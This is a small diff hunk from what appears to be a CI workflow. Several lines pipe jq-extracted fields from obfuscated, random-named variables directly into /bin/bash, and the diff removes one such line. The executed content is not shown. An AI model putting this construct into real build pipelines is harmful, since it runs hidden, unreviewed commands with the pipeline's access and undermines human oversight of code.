@@ -21,7 +21,6 @@ jobs:
           echo $xlzr0646 | jq -r .wmook767 | /bin/bash
           printf '%s' "$dfu76356" | jq -r .cetf64 | /bin/bash
           printf '%s' "$puc38" | jq -r .fedj837 | /bin/bash
-          echo $vcy4237 | jq -r .ifo65 | /bin/bash
           echo $m3 | jq -r .e77 | /bin/bash
 
       - name: Archive output
